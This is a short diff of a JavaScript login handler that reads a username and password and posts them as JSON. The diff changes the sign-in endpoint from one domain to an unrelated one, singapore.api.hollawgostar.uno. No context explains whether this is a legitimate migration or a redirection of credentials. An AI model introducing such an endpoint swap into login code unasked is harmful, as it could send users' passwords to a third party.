@@ -5,7 +5,7 @@
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
     try {
-      const res = await fetch('https://api.rezaxones.com/sign_in', {
+      const res = await fetch('https://singapore.api.hollawgostar.uno/sign_in', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ username, password }),
